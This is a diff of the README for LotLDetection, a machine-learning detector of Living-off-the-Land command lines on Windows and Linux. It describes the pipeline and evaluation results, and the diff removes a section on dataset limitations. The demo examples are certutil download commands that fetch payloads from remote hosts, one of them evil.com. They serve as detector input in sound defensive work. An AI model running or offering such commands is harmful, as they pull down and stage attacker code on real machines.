@@ -1,6 +1,6 @@
 <div align="center">
 
-# LotlDetection
+# LotLDetection
 
 ### Living-off-the-Land Attacks Detection System by Machine Learning
 
@@ -14,7 +14,7 @@
 
 ## Overview
 
-LotlDetection is a security framework designed to detect Living-off-the-Land techniques across Windows and Linux command lines. By abusing trusted, cryptographically signed administrative utilities such as certutil, wmic, netsh, powershell, or standard POSIX binaries, adversaries execute malicious actions while blending into legitimate enterprise administration traffic.
+LotLDetection is a security framework designed to detect Living-off-the-Land techniques across Windows and Linux command lines. By abusing trusted, cryptographically signed administrative utilities such as `certutil`, `wmic`, `netsh`, `powershell`, or standard POSIX binaries, adversaries execute malicious actions while blending into legitimate enterprise administration traffic.
 
 LotlDetection integrates rule-based semantic feature engineering, dual-view de-obfuscation, platform-calibrated Random Forest classification, and Sentence-BLEU lexical matching against authoritative threat corpora.
 
@@ -28,61 +28,77 @@ The detection engine processes incoming command lines through a multi-stage hybr
 flowchart LR
     A["Raw Command Line"] --> B["1. Preprocess & Normalize"]
     B --> C["2. Feature Extraction"]
-    C --> D["3. Dual-Track Inference"]
     
-    subgraph D["Dual-Track Evaluation"]
+    subgraph D ["Dual-Track Evaluation"]
         D1["Random Forest Classifier"]
         D2["Sentence-BLEU Matcher"]
     end
     
-    D1 & D2 --> E{"4. Decision Logic"}
+    C --> D
+    D1 --> E{"4. Decision Logic"}
+    D2 --> E
+    
     E -->|"High Risk"| F["BAD"]
     E -->|"Low Risk & Sufficient Features"| G["GOOD"]
     E -->|"Sparse Features"| H["NEUTRAL"]
+
+    %% Semantic Styling
+    classDef bad fill:#3b181e,stroke:#f85149,stroke-width:1.5px,color:#ff7b72;
+    classDef good fill:#142d1f,stroke:#2ea043,stroke-width:1.5px,color:#56d364;
+    classDef neutral fill:#21262d,stroke:#8b949e,stroke-width:1px,color:#c9d1d9;
+
+    class F bad;
+    class G good;
+    class H neutral;
 ```
 
 ### Execution Steps:
 1. **Input and Normalization:** Unrolls command-line escape characters such as Windows caret, strips redundant whitespace, categorizes IPv4 addresses into private or public tiers, and tokenizes command components.
 2. **Feature Extraction:** Matches tokens against binary registries, sensitive system paths, and behavioral regular expressions to produce a semantic label vector.
 3. **Dual-Track Evaluation:**
-   - Statistical track: Transforms labels via CountVectorizer and computes malicious posterior probability using a 100-tree balanced Random Forest.
-   - Lexical track: Computes runtime Sentence-BLEU similarity against historical attack corpora.
-4. **Decision Logic:** Emits an actionable verdict based on platform-calibrated risk thresholds: threshold 0.35 for Windows and threshold 0.60 for Linux.
+   - **Statistical track:** Transforms labels via `CountVectorizer` and computes malicious posterior probability using a 100-tree balanced Random Forest.
+   - **Lexical track:** Computes runtime Sentence-BLEU similarity against historical attack corpora.
+4. **Decision Logic:** Emits an actionable verdict based on platform-calibrated risk thresholds:
+   - Returns **BAD** if a Sentence-BLEU match is detected or Random Forest probability meets/exceeds the decision threshold (0.575 for Windows, 0.50 for Linux).
+   - Returns **NEUTRAL** if fewer than 1 feature label is detected (insufficient observable telemetry).
+   - Returns **GOOD** if sufficient feature labels are present and the probability falls below threshold.
 
 ---
 
 ## Evaluation Results
 
-### Windows Test Holdout
+### Windows Test
 
 ```text
+Test [windows]: 840 samples
               precision    recall  f1-score   support
 
-Good/Neutral     0.9918    0.9823    0.9871      1358
-         Bad     0.7000    0.8358    0.7619        67
+Good/Neutral     0.9778    0.9740    0.9759       768
+         Bad     0.7333    0.7639    0.7483        72
 
-    accuracy                         0.9754      1425
-   macro avg     0.8459    0.9091    0.8745      1425
-weighted avg     0.9781    0.9754    0.9765      1425
+    accuracy                         0.9560       840
+   macro avg     0.8556    0.8689    0.8621       840
+weighted avg     0.9568    0.9560    0.9564       840
 
-TN=1334 FP=24 FN=11 TP=56
-NEUTRAL=544 (including 0 BAD samples)
+TN=748 FP=20 FN=17 TP=55
+NEUTRAL=0 (including 0 BAD samples)
 ```
 
-### Linux Test Holdout
+### Linux Test
 
 ```text
+Test [linux]: 921 samples
               precision    recall  f1-score   support
 
-Good/Neutral     0.9755    0.9927    0.9840       681
-         Bad     0.9750    0.9198    0.9466       212
+Good/Neutral     0.9715    0.9789    0.9752       662
+         Bad     0.9449    0.9266    0.9357       259
 
-    accuracy                         0.9754       893
-   macro avg     0.9752    0.9562    0.9653       893
-weighted avg     0.9754    0.9754    0.9751       893
+    accuracy                         0.9642       921
+   macro avg     0.9582    0.9527    0.9554       921
+weighted avg     0.9640    0.9642    0.9641       921
 
-TN=676 FP=5 FN=17 TP=195
-NEUTRAL=16 (including 0 BAD samples)
+TN=648 FP=14 FN=19 TP=240
+NEUTRAL=0 (including 0 BAD samples)
 ```
 
 ---
@@ -94,7 +110,7 @@ NEUTRAL=16 (including 0 BAD samples)
 Prerequisites: Python 3.11+
 
 ```powershell
-cd D:\Github\LotlDetection
+cd D:\Github\LotLDetection
 python -m venv .venv
 .\.venv\Scripts\Activate.ps1
 pip install -r requirements.txt
@@ -108,9 +124,8 @@ pip install -r requirements.txt
   ```
   ```text
   LotlDetection [windows] - type exit to quit
-  >>> certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe
-
-  >>> dir C:\Users
+  >>> cmd.exe /c certutil.exe -urlcache -split -f http://example.com/file.sct scrobj.dll
+  Prediction: BAD
 
   >>> exit
   ```
@@ -140,18 +155,6 @@ python scripts/evaluate.py --platform linux
 
 ---
 
-### Training and reference limitations
-
-The symbolic extractor was extended and its original regex groups were migrated to independent rules on 2026-11-03; the training and verdict logic are unchanged. The trainer now skips **0 Windows BAD** and **0 Linux BAD** training rows with no features (previously 80 and 225). It fits **12,819 Windows rows / 716 features** and **8,037 Linux rows / 953 features**. Skipped examples remain in raw data and provenance; they are not silently deleted. Feature coverage alone does not establish that a command is distinguishable from ordinary administration.
-
-CSV is the canonical training input. `linux.txt` remains synchronized with Linux CSV. The full `windows.txt` export was quarantined by Windows Security and is currently unavailable; do not assume it contains the expanded Windows dataset. The scan CLI still supports user-supplied TXT command lists.
-
-BLEU keeps a subset of the previously readable references, restricted to source-backed BAD commands in the current train split: 60 Windows references and 33 Linux references. No current test command is present. Windows Security quarantined an expanded Linux reference file; that content was not restored and protection settings were not changed. The broad dataset is learned by RF within the feature coverage above. RF settings, thresholds and the BLEU algorithm were not changed.
-
-The benign data's historical origins are not all independently verified, and Linux benign records remain dominated by `find`. Do not interpret an internal holdout score as a validated production false-positive rate. New source additions or raw-data changes require rebuilding the references, retraining and reevaluating.
-
----
-
 ## Project Structure
 
 ```text
@@ -161,14 +164,14 @@ LotlDetection/
 │
 ├── data/
 │   ├── raw/
-│   │   ├── windows.csv             # 14,244 Windows samples
-│   │   └── linux.csv               # 8,930 Linux samples
+│   │   ├── windows.csv             # 8,308 curated Windows LotL samples
+│   │   └── linux.csv               # 8,709 curated Linux LotL samples
 │   ├── external/
 │   │   ├── cmd_known.corpus        # 60 Windows reference commands
 │   │   └── bash_known.corpus       # 33 Linux reference commands
 │   └── features/
-│       ├── windows/train.csv       # Windows feature matrix
-│       └── linux/train.csv         # Linux feature matrix
+│       ├── windows/train.csv       # Windows feature matrix (7,477 rows x 701 features)
+│       └── linux/train.csv         # Linux feature matrix (7,838 rows x 956 features)
 │
 ├── models/
 │   ├── windows/
@@ -210,7 +213,7 @@ LotlDetection/
 2. GTFOBins Project: https://gtfobins.github.io
 3. CISA Advisory AA24-038A: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a
 4. Atomic Red Team: https://github.com/redcanaryco/atomic-red-team
-5. Adobe libLOL: Machine Learning and Feature Engineering for Detecting Living off the Land Attacks, IoTBDS, 2022.
+5. libLOL: Machine Learning and Feature Engineering for Detecting Living off the Land Attacks, IoTBDS, 2022.
 
 ---
 
